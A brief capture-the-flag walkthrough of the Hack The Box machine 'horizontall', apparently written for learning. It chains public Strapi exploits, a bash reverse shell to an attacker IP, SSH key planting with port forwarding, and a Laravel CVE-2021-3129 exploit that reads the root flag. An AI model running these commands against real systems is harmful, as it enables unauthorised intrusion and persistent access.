horizontall
---

## Steps

1. enumerate subdomains

`wfuzz -w /subdomains-top1million-110000.txt -u http://horizontall.htb/ -hc 301 -v -c -H "Host:FUZZ.horizontall.htb"

We find `api-prod.horizontall.htb`

2. enumerating subdirectories

`gobuster dir -u api-prod.horizontall.htb -w /usr/share/wordlists/dirb/common.txt`

We get `/admin` as a subdirectoy, and going to it, we get redirected to `/login`

2. RCE 1 - Reset Password

https://www.exploit-db.com/exploits/50239

This exploit allows you to reset the password for the user `admin`, and set it to `SuperStringPassword1`

3. Logging in as admin and RCE 2

https://www.exploit-db.com/exploits/50238

This exploit requires the JWT generated by RCE, and it allows you to perform RCE.

Naturally, we call a reverse shell

```
python3 rce2.py http://api-prod.horizontall.htb  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2NzY5MzQzLCJleHAiOjE2MzkzNjEzNDN9.u0Myxy4hAQoKjzE3UXx4YOVH27yGnGFtsEdBxScn9j8 "bash -c 'bash -i >& /dev/tcp/10.10.14.2/9998 0>&1'" 10.10.14.2 
```

With this shell, we can get the user flag

## Root flag

1. Get listening services

`ss -tuan | grep LISTEN`

We see that a service is running on port 8000

2. Port Forwarding

We port forward it to our attacker machine.

On the attacker machine, we copy our public key over to the victim machine, and put it in `~/.ssh/authorized_keys`

We then run 

`ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb`

3. RCE 3

Going to localhost:8000 on our attacker machine, we can see the service running of port 8000 on the victim machine

We see that it's Larvarel v8, which has an RCE

https://github.com/nth347/CVE-2021-3129_exploit

`./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"





